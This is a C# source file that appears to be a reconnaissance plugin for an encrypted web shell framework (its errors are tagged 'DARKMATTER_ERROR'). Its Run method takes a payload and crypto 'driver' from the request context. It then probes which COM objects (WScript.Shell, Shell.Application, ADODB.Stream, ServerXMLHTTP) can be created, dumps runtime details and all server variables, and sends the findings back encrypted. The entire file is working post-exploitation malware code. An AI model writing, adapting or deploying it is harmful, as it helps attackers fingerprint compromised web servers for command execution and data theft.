using System;
using System.Web;
using System.Text;
using System.Collections.Generic;
using System.Reflection;
using System.Threading;

public class info
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnTestObj(string progId)
    {
        try
        {
            Type comType = Type.GetTypeFromProgID(progId);
            if (comType != null)
            {
                object obj = Activator.CreateInstance(comType);
                if (obj != null)
                {
                    System.Runtime.InteropServices.Marshal.ReleaseComObject(obj);
                    return "AVAILABLE";
                }
            }
            return "NOT INSTALLED";
        }
        catch
        {
            return "NOT INSTALLED";
        }
    }

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
        response.Flush();
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null) return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            StringBuilder sb = new StringBuilder();
            sb.Append("<table border='1' cellpadding='5' cellspacing='0'>");

            sb.Append("<tr><th colspan='2' align='left'>.NET ENGINE & SYSTEM</th></tr>");
            sb.Append("<tr><td>Engine</td><td>.NET CLR " + Environment.Version.ToString() + "</td></tr>");
            sb.Append("<tr><td>Timeout</td><td>" + context.Server.ScriptTimeout + "</td></tr>");
            sb.Append("<tr><td>SessionID</td><td>" + (context.Session != null ? context.Session.SessionID : "N/A") + "</td></tr>");
            
            string arch = Environment.Is64BitOperatingSystem ? "AMD64" : "x86";
            string processArch = Environment.Is64BitProcess ? "64-bit Process" : "32-bit Process";
            sb.Append("<tr><td>Architecture</td><td>" + arch + " (" + processArch + ")</td></tr>");

            sb.Append("<tr><th colspan='2' align='left'>CORE COM COMPONENTS</th></tr>");
            string[] comComponents = new string[] {
                "Scripting.FileSystemObject",
                "Scripting.Dictionary",
                "ADODB.Connection",
                "ADODB.Recordset",
                "ADODB.Stream",
                "MSXML2.DOMDocument.6.0",
                "MSXML2.DOMDocument.3.0",
                "MSXML2.ServerXMLHTTP.6.0",
                "Microsoft.XMLHTTP",
                "WScript.Shell",
                "Shell.Application",
                "CDO.Message"
            };

            foreach (string com in comComponents)
            {
                sb.Append("<tr><td>" + com + "</td><td>" + fnTestObj(com) + "</td></tr>");
            }

            sb.Append("<tr><th colspan='2' align='left'>SERVER VARIABLES</th></tr>");
            foreach (string key in request.ServerVariables.AllKeys)
            {
                string value = request.ServerVariables[key];
                if (!string.IsNullOrEmpty(value))
                {
                    sb.Append("<tr><td>" + key + "</td><td>" + context.Server.HtmlEncode(value) + "</td></tr>");
                }
            }

            sb.Append("</table>");

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));

            context.ApplicationInstance.CompleteRequest();
        }
        catch (ThreadAbortException)
        {
            
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}